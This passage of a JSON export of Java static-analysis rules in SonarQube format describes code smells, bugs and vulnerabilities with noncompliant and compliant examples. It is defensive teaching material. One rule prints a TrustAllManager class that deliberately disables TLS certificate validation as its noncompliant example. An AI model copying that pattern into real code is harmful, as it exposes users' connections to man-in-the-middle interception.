href=\"https://docs.oracle.com/javase/8/docs/api/java/util/stream/Stream.html#peek-java.util.function.Consumer-\">Java 8 API Documentation</a>\n  </li>\n  <li> 4comprehension: <a href=\"https://4comprehension.com/idiomatic-peeking/\">Idiomatic Peeking with Java Stream API</a> </li>\n  <li> Data Geekery: <a href=\"https://blog.jooq.org/2014/06/13/java-8-friday-10-subtle-mistakes-when-using-the-streams-api/\">10 Subtle Mistakes When\n  Using the Streams API</a> </li>\n</ul>",
            "severity": "MAJOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "java8",
                "pitfall"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "5min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "5min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "5min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "5min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S1444",
            "repo": "java",
            "name": "\"public static\" fields should be constant",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>There is no good reason to declare a field \"public\" and \"static\" without also declaring it \"final\". Most of the time this is a kludge to share a\nstate among several objects. But with this approach, any object can do whatever it wants with the shared state, such as setting it to\n<code>null</code>. </p>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic class Greeter {\n  public static Foo foo = new Foo();\n  ...\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\npublic class Greeter {\n  public static final Foo FOO = new Foo();\n  ...\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"http://cwe.mitre.org/data/definitions/500.html\">MITRE, CWE-500</a> - Public Static Field Not Marked Final </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/WjdGBQ\">CERT OBJ10-J.</a> - Do not use public static nonfinal fields </li>\n</ul>",
            "mdDesc": "<p>There is no good reason to declare a field \"public\" and \"static\" without also declaring it \"final\". Most of the time this is a kludge to share a\nstate among several objects. But with this approach, any object can do whatever it wants with the shared state, such as setting it to\n<code>null</code>. </p>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic class Greeter {\n  public static Foo foo = new Foo();\n  ...\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\npublic class Greeter {\n  public static final Foo FOO = new Foo();\n  ...\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"http://cwe.mitre.org/data/definitions/500.html\">MITRE, CWE-500</a> - Public Static Field Not Marked Final </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/WjdGBQ\">CERT OBJ10-J.</a> - Do not use public static nonfinal fields </li>\n</ul>",
            "severity": "MINOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "cert",
                "cwe"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "20min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "20min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "20min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "20min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S4830",
            "repo": "java",
            "name": "Server certificates should be verified during SSL/TLS connections",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>Validation of X.509 certificates is essential to create secure SSL/TLS sessions not vulnerable to man-in-the-middle attacks. </p>\n<p>The certificate chain validation includes these steps:</p>\n<ul>\n  <li> The certificate is issued by its parent Certificate Authority or the root CA trusted by the system. </li>\n  <li> Each CA is allowed to issue certificates. </li>\n  <li> Each certificate in the chain is not expired. </li>\n</ul>\n<p>This rule raises an issue when an implementation of X509TrustManager is not controlling the validity of the certificate (ie: no exception is\nraised). Empty implementations of the <code>X509TrustManager</code> interface are often created to disable certificate validation. The correct\nsolution is to provide an appropriate trust store.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nclass TrustAllManager implements X509TrustManager {\n\n    @Override\n    public void checkClientTrusted(X509Certificate[] chain, String authType) throws CertificateException {  // Noncompliant, nothing means trust any client\n    }\n\n    @Override\n    public void checkServerTrusted(X509Certificate[] chain, String authType) throws CertificateException { // Noncompliant, this method never throws exception, it means trust any server\n        LOG.log(Level.SEVERE, ERROR_MESSAGE);\n    }\n\n    @Override\n    public X509Certificate[] getAcceptedIssuers() {\n        return null;\n    }\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://www.owasp.org/index.php/Top_10-2017_A6-Security_Misconfiguration\">OWASP Top 10 2017 Category A6</a> - Security\n  Misconfiguration </li>\n  <li> <a href=\"http://cwe.mitre.org/data/definitions/295.html\">MITRE, CWE-295</a> - Improper Certificate Validation </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/hDdGBQ\">CERT, MSC61-J.</a> - Do not use insecure or weak cryptographic algorithms </li>\n</ul>",
            "mdDesc": "<p>Validation of X.509 certificates is essential to create secure SSL/TLS sessions not vulnerable to man-in-the-middle attacks. </p>\n<p>The certificate chain validation includes these steps:</p>\n<ul>\n  <li> The certificate is issued by its parent Certificate Authority or the root CA trusted by the system. </li>\n  <li> Each CA is allowed to issue certificates. </li>\n  <li> Each certificate in the chain is not expired. </li>\n</ul>\n<p>This rule raises an issue when an implementation of X509TrustManager is not controlling the validity of the certificate (ie: no exception is\nraised). Empty implementations of the <code>X509TrustManager</code> interface are often created to disable certificate validation. The correct\nsolution is to provide an appropriate trust store.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nclass TrustAllManager implements X509TrustManager {\n\n    @Override\n    public void checkClientTrusted(X509Certificate[] chain, String authType) throws CertificateException {  // Noncompliant, nothing means trust any client\n    }\n\n    @Override\n    public void checkServerTrusted(X509Certificate[] chain, String authType) throws CertificateException { // Noncompliant, this method never throws exception, it means trust any server\n        LOG.log(Level.SEVERE, ERROR_MESSAGE);\n    }\n\n    @Override\n    public X509Certificate[] getAcceptedIssuers() {\n        return null;\n    }\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://www.owasp.org/index.php/Top_10-2017_A6-Security_Misconfiguration\">OWASP Top 10 2017 Category A6</a> - Security\n  Misconfiguration </li>\n  <li> <a href=\"http://cwe.mitre.org/data/definitions/295.html\">MITRE, CWE-295</a> - Improper Certificate Validation </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/hDdGBQ\">CERT, MSC61-J.</a> - Do not use insecure or weak cryptographic algorithms </li>\n</ul>",
            "severity": "CRITICAL",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "cert",
                "cwe",
                "owasp-a3",
                "owasp-a6",
                "privacy",
                "ssl"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "5min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "5min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "5min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "5min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "VULNERABILITY"
        },
        {
            "key": "java:S1201",
            "repo": "java",
            "name": "\"equals\" method overrides should accept \"Object\" parameters",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>\"equals\" as a method name should be used exclusively to override <code>Object.equals(Object)</code> to prevent any confusion.</p>\n<p>It is tempting to overload the method to take a specific class instead of <code>Object</code> as parameter, to save the class comparison check.\nHowever, this will not work as expected when that is the only override.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nclass MyClass {\n  private int foo = 1;\n\n  public boolean equals(MyClass o) {  // Noncompliant; does not override Object.equals(Object)\n    return o != null &amp;&amp; o.foo == this.foo;\n  }\n\n  public static void main(String[] args) {\n    MyClass o1 = new MyClass();\n    Object o2 = new MyClass();\n    System.out.println(o1.equals(o2));  // Prints \"false\" because o2 an Object not a MyClass\n  }\n}\n\nclass MyClass2 {\n  public boolean equals(MyClass2 o) {  // Ignored; `boolean equals(Object)` also present\n    //..\n  }\n\n  public boolean equals(Object o) {\n    //...\n  }\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nclass MyClass {\n  private int foo = 1;\n\n  @Override\n  public boolean equals(Object o) {\n    if (this == o) {\n        return true;\n    }\n    if (o == null || getClass() != o.getClass()) {\n      return false;\n    }\n\n    MyClass other = (MyClass)o;\n    return this.foo == other.foo;\n  }\n\n  /* ... */\n}\n\nclass MyClass2 {\n  public boolean equals(MyClass2 o) {\n    //..\n  }\n\n  public boolean equals(Object o) {\n    //...\n  }\n}\n</pre>",
            "mdDesc": "<p>\"equals\" as a method name should be used exclusively to override <code>Object.equals(Object)</code> to prevent any confusion.</p>\n<p>It is tempting to overload the method to take a specific class instead of <code>Object</code> as parameter, to save the class comparison check.\nHowever, this will not work as expected when that is the only override.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nclass MyClass {\n  private int foo = 1;\n\n  public boolean equals(MyClass o) {  // Noncompliant; does not override Object.equals(Object)\n    return o != null &amp;&amp; o.foo == this.foo;\n  }\n\n  public static void main(String[] args) {\n    MyClass o1 = new MyClass();\n    Object o2 = new MyClass();\n    System.out.println(o1.equals(o2));  // Prints \"false\" because o2 an Object not a MyClass\n  }\n}\n\nclass MyClass2 {\n  public boolean equals(MyClass2 o) {  // Ignored; `boolean equals(Object)` also present\n    //..\n  }\n\n  public boolean equals(Object o) {\n    //...\n  }\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nclass MyClass {\n  private int foo = 1;\n\n  @Override\n  public boolean equals(Object o) {\n    if (this == o) {\n        return true;\n    }\n    if (o == null || getClass() != o.getClass()) {\n      return false;\n    }\n\n    MyClass other = (MyClass)o;\n    return this.foo == other.foo;\n  }\n\n  /* ... */\n}\n\nclass MyClass2 {\n  public boolean equals(MyClass2 o) {\n    //..\n  }\n\n  public boolean equals(Object o) {\n    //...\n  }\n}\n</pre>",
            "severity": "MAJOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "suspicious"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "10min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "10min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "10min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "10min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "BUG"
        },
        {
            "key": "java:S3986",
            "repo": "java",
            "name": "Week Year (\"YYYY\") should not be used for date formatting",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>Few developers are aware of the difference between <code>Y</code> for \"Week year\" and <code>y</code> for Year when formatting and parsing a date\nwith <code>SimpleDateFormat</code> or <code>DateTimeFormatter</code>. That's likely because for most dates, Week year and Year are the same, so\ntesting at any time other than the first or last week of the year will yield the same value for both <code>y</code> and <code>Y</code>. But in the\nlast week of December and the first week of January, you may get unexpected results.</p>\n<p>According to the <a href=\"http://docs.oracle.com/javase/8/docs/api/java/util/GregorianCalendar.html#week_year\">Javadoc</a>:</p>\n<blockquote>\n  <p>A week year is in sync with a WEEK_OF_YEAR cycle. All weeks between the first and last weeks (inclusive) have the same week year value.\n  Therefore, the first and last days of a week year may have different calendar year values.</p>\n  <p>For example, January 1, 1998 is a Thursday. If getFirstDayOfWeek() is MONDAY and getMinimalDaysInFirstWeek() is 4 (ISO 8601 standard compatible\n  setting), then week 1 of 1998 starts on December 29, 1997, and ends on January 4, 1998. The week year is 1998 for the last three days of calendar\n  year 1997. If, however, getFirstDayOfWeek() is SUNDAY, then week 1 of 1998 starts on January 4, 1998, and ends on January 10, 1998; the first three\n  days of 1998 then are part of week 53 of 1997 and their week year is 1997.</p>\n</blockquote>\n<h2>Noncompliant Code Example</h2>\n<pre>\nDate date = new SimpleDateFormat(\"yyyy/MM/dd\").parse(\"2015/12/31\");\nString result = new SimpleDateFormat(\"YYYY/MM/dd\").format(date);   //Noncompliant; yields '2016/12/31'\nresult = DateTimeFormatter.ofPattern(\"YYYY/MM/dd\").format(date); //Noncompliant; yields '2016/12/31'\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nDate date = new SimpleDateFormat(\"yyyy/MM/dd\").parse(\"2015/12/31\");\nString result = new SimpleDateFormat(\"yyyy/MM/dd\").format(date);   //Yields '2015/12/31' as expected\nresult = DateTimeFormatter.ofPattern(\"yyyy/MM/dd\").format(date); //Yields '2015/12/31' as expected\n</pre>\n<h2>Exceptions</h2>\n<pre>\nDate date = new SimpleDateFormat(\"yyyy/MM/dd\").parse(\"2015/12/31\");\nString result = new SimpleDateFormat(\"YYYY-ww\").format(date);  //compliant, 'Week year' is used along with 'Week of year'. result = '2016-01'\nDateTimeFormatter.ofPattern(\"YYYY-ww\").format(date); //compliant; yields '2016-01' as expected\n</pre>",
            "mdDesc": "<p>Few developers are aware of the difference between <code>Y</code> for \"Week year\" and <code>y</code> for Year when formatting and parsing a date\nwith <code>SimpleDateFormat</code> or <code>DateTimeFormatter</code>. That's likely because for most dates, Week year and Year are the same, so\ntesting at any time other than the first or last week of the year will yield the same value for both <code>y</code> and <code>Y</code>. But in the\nlast week of December and the first week of January, you may get unexpected results.</p>\n<p>According to the <a href=\"http://docs.oracle.com/javase/8/docs/api/java/util/GregorianCalendar.html#week_year\">Javadoc</a>:</p>\n<blockquote>\n  <p>A week year is in sync with a WEEK_OF_YEAR cycle. All weeks between the first and last weeks (inclusive) have the same week year value.\n  Therefore, the first and last days of a week year may have different calendar year values.</p>\n  <p>For example, January 1, 1998 is a Thursday. If getFirstDayOfWeek() is MONDAY and getMinimalDaysInFirstWeek() is 4 (ISO 8601 standard compatible\n  setting), then week 1 of 1998 starts on December 29, 1997, and ends on January 4, 1998. The week year is 1998 for the last three days of calendar\n  year 1997. If, however, getFirstDayOfWeek() is SUNDAY, then week 1 of 1998 starts on January 4, 1998, and ends on January 10, 1998; the first three\n  days of 1998 then are part of week 53 of 1997 and their week year is 1997.</p>\n</blockquote>\n<h2>Noncompliant Code Example</h2>\n<pre>\nDate date = new SimpleDateFormat(\"yyyy/MM/dd\").parse(\"2015/12/31\");\nString result = new SimpleDateFormat(\"YYYY/MM/dd\").format(date);   //Noncompliant; yields '2016/12/31'\nresult = DateTimeFormatter.ofPattern(\"YYYY/MM/dd\").format(date); //Noncompliant; yields '2016/12/31'\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nDate date = new SimpleDateFormat(\"yyyy/MM/dd\").parse(\"2015/12/31\");\nString result = new SimpleDateFormat(\"yyyy/MM/dd\").format(date);   //Yields '2015/12/31' as expected\nresult = DateTimeFormatter.ofPattern(\"yyyy/MM/dd\").format(date); //Yields '2015/12/31' as expected\n</pre>\n<h2>Exceptions</h2>\n<pre>\nDate date = new SimpleDateFormat(\"yyyy/MM/dd\").parse(\"2015/12/31\");\nString result = new SimpleDateFormat(\"YYYY-ww\").format(date);  //compliant, 'Week year' is used along with 'Week of year'. result = '2016-01'\nDateTimeFormatter.ofPattern(\"YYYY-ww\").format(date); //compliant; yields '2016-01' as expected\n</pre>",
            "severity": "MAJOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "suspicious"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "2min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "2min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "2min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "2min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "BUG"
        },
        {
            "key": "java:S2653",
            "repo": "java",
            "name": "Web applications should not have a \"main\" method",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>There is no reason to have a <code>main</code> method in a web application. It may have been useful for debugging during application development,\nbut such a method should never make it into production. Having a <code>main</code> method in a web application opens a door to the application logic\nthat an attacker may never be able to reach (but watch out if one does!), but it is a sloppy practice and indicates that other problems may be\npresent.</p>\n<p>This rule raises an issue when a <code>main</code> method is found in a servlet or an EJB.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic class MyServlet extends HttpServlet {\n  public void doGet(HttpServletRequest req, HttpServletResponse res) throws ServletException, IOException {\n    if (userIsAuthorized(req)) {\n      updatePrices(req);\n    }\n  }\n\n  public static void main(String[] args) { // Noncompliant\n    updatePrices(req);\n  }\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://www.owasp.org/index.php/Top_10-2017_A3-Sensitive_Data_Exposure\">OWASP Top 10 2017 Category A3</a> - Sensitive Data Exposure\n  </li>\n  <li> <a href=\"http://cwe.mitre.org/data/definitions/489.html\">MITRE, CWE-489</a> - Leftover Debug Code </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/qzVGBQ\">CERT, ENV06-J.</a> - Production code must not contain debugging entry points </li>\n</ul>",
            "mdDesc": "<p>There is no reason to have a <code>main</code> method in a web application. It may have been useful for debugging during application development,\nbut such a method should never make it into production. Having a <code>main</code> method in a web application opens a door to the application logic\nthat an attacker may never be able to reach (but watch out if one does!), but it is a sloppy practice and indicates that other problems may be\npresent.</p>\n<p>This rule raises an issue when a <code>main</code> method is found in a servlet or an EJB.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic class MyServlet extends HttpServlet {\n  public void doGet(HttpServletRequest req, HttpServletResponse res) throws ServletException, IOException {\n    if (userIsAuthorized(req)) {\n      updatePrices(req);\n    }\n  }\n\n  public static void main(String[] args) { // Noncompliant\n    updatePrices(req);\n  }\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://www.owasp.org/index.php/Top_10-2017_A3-Sensitive_Data_Exposure\">OWASP Top 10 2017 Category A3</a> - Sensitive Data Exposure\n  </li>\n  <li> <a href=\"http://cwe.mitre.org/data/definitions/489.html\">MITRE, CWE-489</a> - Leftover Debug Code </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/qzVGBQ\">CERT, ENV06-J.</a> - Production code must not contain debugging entry points </li>\n</ul>",
            "severity": "CRITICAL",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "cert",
                "cwe",
                "jee",
                "owasp-a3"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "5min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "5min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "5min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "5min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "VULNERABILITY"
        },
        {
            "key": "java:S3984",
            "repo": "java",
            "name": "Exceptions should not be created without being thrown",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>Creating a new <code>Throwable</code> without actually throwing it is useless and is probably due to a mistake.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nif (x &lt; 0)\n  new IllegalArgumentException(\"x must be nonnegative\");\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nif (x &lt; 0)\n  throw new IllegalArgumentException(\"x must be nonnegative\");\n</pre>",
            "mdDesc": "<p>Creating a new <code>Throwable</code> without actually throwing it is useless and is probably due to a mistake.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nif (x &lt; 0)\n  new IllegalArgumentException(\"x must be nonnegative\");\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nif (x &lt; 0)\n  throw new IllegalArgumentException(\"x must be nonnegative\");\n</pre>",
            "severity": "MAJOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "error-handling"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "2min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "2min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "2min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "2min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "BUG"
        },
        {
            "key": "java:S1200",
            "repo": "java",
            "name": "Classes should not be coupled to too many other classes (Single Responsibility Principle)",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>According to the Single Responsibility Principle, introduced by Robert C. Martin in his book \"Principles of Object Oriented Design\", a class should\nhave only one responsibility:</p>\n<blockquote>\n  <p>If a class has more than one responsibility, then the responsibilities become coupled.</p>\n  <p>Changes to one responsibility may impair or inhibit the class' ability to meet the others.</p>\n  <p>This kind of coupling leads to fragile designs that break in unexpected ways when changed.</p>\n</blockquote>\n<p>Classes which rely on many other classes tend to aggregate too many responsibilities and should be split into several smaller ones.</p>\n<p>Nested classes dependencies are not counted as dependencies of the outer class.</p>\n<h2>Noncompliant Code Example</h2>\n<p>With a threshold of 5:</p>\n<pre>\nclass Foo {                        // Noncompliant - Foo depends on too many classes: T1, T2, T3, T4, T5, T6 and T7\n  T1 a1;                           // Foo is coupled to T1\n  T2 a2;                           // Foo is coupled to T2\n  T3 a3;                           // Foo is coupled to T3\n\n  public T4 compute(T5 a, T6 b) {  // Foo is coupled to T4, T5 and T6\n    T7 result = a.getResult(b);    // Foo is coupled to T7\n    return result;\n  }\n\n  public static class Bar {        // Compliant - Bar depends on 2 classes: T8 and T9\n    T8 a8;\n    T9 a9;\n  }\n}\n</pre>",
            "mdDesc": "<p>According to the Single Responsibility Principle, introduced by Robert C. Martin in his book \"Principles of Object Oriented Design\", a class should\nhave only one responsibility:</p>\n<blockquote>\n  <p>If a class has more than one responsibility, then the responsibilities become coupled.</p>\n  <p>Changes to one responsibility may impair or inhibit the class' ability to meet the others.</p>\n  <p>This kind of coupling leads to fragile designs that break in unexpected ways when changed.</p>\n</blockquote>\n<p>Classes which rely on many other classes tend to aggregate too many responsibilities and should be split into several smaller ones.</p>\n<p>Nested classes dependencies are not counted as dependencies of the outer class.</p>\n<h2>Noncompliant Code Example</h2>\n<p>With a threshold of 5:</p>\n<pre>\nclass Foo {                        // Noncompliant - Foo depends on too many classes: T1, T2, T3, T4, T5, T6 and T7\n  T1 a1;                           // Foo is coupled to T1\n  T2 a2;                           // Foo is coupled to T2\n  T3 a3;                           // Foo is coupled to T3\n\n  public T4 compute(T5 a, T6 b) {  // Foo is coupled to T4, T5 and T6\n    T7 result = a.getResult(b);    // Foo is coupled to T7\n    return result;\n  }\n\n  public static class Bar {        // Compliant - Bar depends on 2 classes: T8 and T9\n    T8 a8;\n    T9 a9;\n  }\n}\n</pre>",
            "severity": "MAJOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "brain-overload"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [
                {
                    "key": "max",
                    "htmlDesc": "Maximum number of classes a single class is allowed to depend upon",
                    "defaultValue": "20",
                    "type": "INTEGER"
                }
            ],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "2h",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "2h",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "2h",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "2h",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S3981",
            "repo": "java",
            "name": "Collection sizes and array length comparisons should make sense",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>The size of a collection and the length of an array are always greater than or equal to zero. So testing that a size or length is greater than or\nequal to zero doesn't make sense, since the result is always <code>true</code>. Similarly testing that it is less than zero will always return\n<code>false</code>. Perhaps the intent was to check the non-emptiness of the collection or array instead. </p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nif (myList.size() &gt;= 0) { ... }\n\nif (myList.size() &lt; 0) { ... }\n\nboolean result = myArray.length &gt;= 0;\n\nif (0 &gt; myArray.length) { ... }\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nif (!myList.isEmpty()) { ... }\n\nif (myArray.length &gt;= 42) { ... }\n</pre>",
            "mdDesc": "<p>The size of a collection and the length of an array are always greater than or equal to zero. So testing that a size or length is greater than or\nequal to zero doesn't make sense, since the result is always <code>true</code>. Similarly testing that it is less than zero will always return\n<code>false</code>. Perhaps the intent was to check the non-emptiness of the collection or array instead. </p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nif (myList.size() &gt;= 0) { ... }\n\nif (myList.size() &lt; 0) { ... }\n\nboolean result = myArray.length &gt;= 0;\n\nif (0 &gt; myArray.length) { ... }\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nif (!myList.isEmpty()) { ... }\n\nif (myArray.length &gt;= 42) { ... }\n</pre>",
            "severity": "MAJOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "2min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "2min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "2min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "2min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "BUG"
        },
        {
            "key": "java:S3740",
            "repo": "java",
            "name": "Raw types should not be used",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>Generic types shouldn't be used raw (without type parameters) in variable declarations or return values. Doing so bypasses generic type checking,\nand defers the catch of unsafe code to runtime.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nList myList; // Noncompliant\nSet mySet; // Noncompliant\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nList&lt;String&gt; myList;\nSet&lt;? extends Number&gt; mySet;\n</pre>",
            "mdDesc": "<p>Generic types shouldn't be used raw (without type parameters) in variable declarations or return values. Doing so bypasses generic type checking,\nand defers the catch of unsafe code to runtime.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nList myList; // Noncompliant\nSet mySet; // Noncompliant\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nList&lt;String&gt; myList;\nSet&lt;? extends Number&gt; mySet;\n</pre>",
            "severity": "MAJOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "pitfall"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "5min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "5min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "5min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "5min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S4838",
            "repo": "java",
            "name": "An iteration on a Collection should be performed on the type handled by the Collection",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>This rule raises an issue when an iteration over the items of a <code>Collection</code> is performed on a super-type of the type handled by the\n<code>Collection</code>.</p>\n<p>Relying on <code>Object</code> or any classes between <code>Object</code> and the real class handled by the <code>Collection</code> is not\nrecommended. While it's accepted by the language, this practice reduces readability of the code and forces to down-cast the item of the\n<code>Collection</code> to be able to call a method on it while simply using the correct type in the iteration makes things more clear and simple.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic Collection&lt;Person&gt; getPersons() { ... }\n\nfor (Object item : getPersons()) { // Noncompliant\n  Person person = (Person) item; // Noncompliant; it's required to down-cast to the to correct type to use \"item\"\n  person.getAdress();\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nfor (Person person : getPersons()) { // Compliant\n  person.getAddress() ;\n}\n</pre>",
